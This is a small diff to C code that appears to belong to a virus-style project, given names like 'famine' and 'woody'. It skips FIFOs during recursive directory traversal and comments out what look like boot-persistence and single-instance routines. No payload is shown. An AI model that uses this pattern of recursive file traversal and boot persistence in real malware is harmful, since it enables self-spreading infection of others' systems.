@@ -23,6 +23,10 @@ void famine_process_recurcive(const char *path, void *input, int woody_init_ok) 
     }
 
     while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_FIFO) {
+            continue;
+        }
+
         if (!ft_strcmp(entry->d_name, ".") || !ft_strcmp(entry->d_name, "..")) {
             continue;
         }
@@ -55,8 +59,8 @@ void famine_main(void *input, int woody_init_ok) {
         }
         int lock_fd = lock_global();
 
-        setup_boot_start();
-        exit_if_process_running();
+        // setup_boot_start();
+        // exit_if_process_running();
         #ifdef FAMINE_BONUS
             char *root_path = getenv("FAMINE_ROOT_PATH");
             if (root_path) {
